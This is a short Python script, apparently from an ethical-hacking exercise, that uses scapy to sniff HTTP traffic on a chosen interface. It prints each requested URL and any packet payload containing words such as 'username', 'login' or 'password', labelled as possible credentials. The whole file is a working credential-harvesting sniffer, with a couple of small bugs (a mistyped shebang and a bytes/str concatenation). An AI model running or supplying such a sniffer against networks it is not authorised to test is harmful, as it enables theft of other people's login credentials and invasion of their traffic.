#!/usr/bin/enc python

import scapy.all as scapy
from scapy.layers import http
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("--i", "--interface", dest="interface", help="Insert the interface. For example: wlan0")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify the interace. Use --help for more info")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username".encode(), "user".encode(), "login".encode(), "password".encode(), "pass".encode()]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> ".encode() + url)

        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] Possible username/password > ".encode() + login_info + "\n\n")


options = get_arguments()
sniff(options.interface)

